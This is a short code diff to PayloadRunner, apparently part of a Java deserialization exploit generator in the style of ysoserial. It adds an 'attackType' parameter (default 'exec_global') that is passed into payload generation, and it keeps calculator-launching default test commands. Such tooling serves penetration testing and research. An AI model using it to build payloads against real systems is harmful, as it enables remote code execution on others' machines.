@@ -21,11 +21,12 @@ public class PayloadRunner {
 		byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
 			public byte[] call() throws Exception {
 				final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();
+				final String attackType = args.length > 1 && args[1] != null ? args[1] : getDefaultAttackType();
 
 				System.out.println("generating payload object(s) for command: '" + command + "'");
 
 				ObjectPayload<?> payload = clazz.newInstance();
-                final Object objBefore = payload.getObject(command);
+                final Object objBefore = payload.getObject(command,attackType);
 
 				System.out.println("serializing payload");
 				byte[] ser = Serializer.serialize(objBefore);
@@ -49,6 +50,10 @@ public class PayloadRunner {
             "/usr/bin/gnome-calculator",
             "/usr/bin/kcalc"
         );
+    }
+    
+    private static String getDefaultAttackType() {
+    	return "exec_global";
     }
 
     private static String getFirstExistingFile(String ... files) {
